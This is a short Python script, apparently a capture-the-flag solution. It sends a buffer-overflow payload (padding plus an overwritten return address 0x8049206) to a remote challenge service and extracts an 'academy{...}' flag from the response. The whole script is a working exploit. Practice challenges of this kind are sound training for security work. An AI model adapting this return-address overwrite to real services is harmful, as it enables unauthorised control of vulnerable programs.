import struct, socket, sys, time, re

host, port = open(r"D:\ctf-index\_z_181url.txt").read().split()
port = int(port)
print("cible:", host, port, flush=True)

stream = open('D:\\ctf-index\\_z_bizz_stream.bin', 'rb').read()
head = stream[:-2]
line = b" " + b"A" * 102 + struct.pack("<I", 0x8049206) + b"\n"
inp = head + b"x" + line
print("bytes a envoyer:", len(inp), flush=True)

s = socket.create_connection((host, port), timeout=20)
s.settimeout(20)
s.sendall(inp)
out = b""
t0 = time.time()
while time.time() - t0 < 40:
    try:
        d = s.recv(65536)
    except socket.timeout:
        break
    if not d:
        break
    out += d
    if b"academy{" in out and b"}" in out.split(b"academy{")[-1]:
        break
s.close()
print("recu:", len(out), flush=True)
print("tail:", out[-300:], flush=True)
m = re.search(rb"academy\{[^}]*\}", out)
print("FLAG:", m.group(0).decode() if m else None)
if m:
    open(r"D:\ctf-index\_z_181flag.txt", "w").write(m.group(0).decode())
